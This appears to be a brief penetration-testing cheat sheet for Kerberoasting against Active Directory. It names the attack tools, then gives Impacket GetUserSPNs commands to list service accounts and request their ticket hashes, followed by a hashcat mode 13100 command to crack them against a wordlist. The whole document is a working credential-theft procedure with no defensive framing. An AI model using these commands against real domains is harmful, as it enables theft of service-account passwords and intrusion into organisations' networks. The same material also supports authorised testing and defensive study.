### Allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.

### Tools: Bloodhound, Invoke-Kerberoast.ps1, Kekeo, Rubeus, Hashcat

## Steps:

#### 1) python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER

#### Insert Password:

#### 2) python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER -request-user USER FOUND ON STEP 1

#### 3) hashcat -a 0 -m 13100 SPN.HASH /path/to/wordlist.txt
